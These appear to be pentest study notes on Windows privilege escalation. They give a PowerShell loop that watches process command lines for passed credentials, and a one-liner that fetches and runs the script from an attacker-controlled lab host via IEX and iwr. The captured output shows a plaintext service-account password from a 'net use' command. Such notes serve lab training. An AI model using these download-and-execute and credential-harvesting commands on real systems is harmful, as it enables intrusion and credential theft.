#### Monitoring for Process Command Lines
there may be scheduled tasks or other processes being executed which pass credentials on the command line.

we can use this powershell script to monitor:
`captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.`
```shell-session
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

```powershell-session
IEX (iwr 'http://10.10.10.205/procmon.ps1') 

@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}       =>       
```
## Vulnerable Services

We may also encounter situations where we land on a host running a vulnerable application that can be used to elevate privileges through user interaction.

check windows lpe module?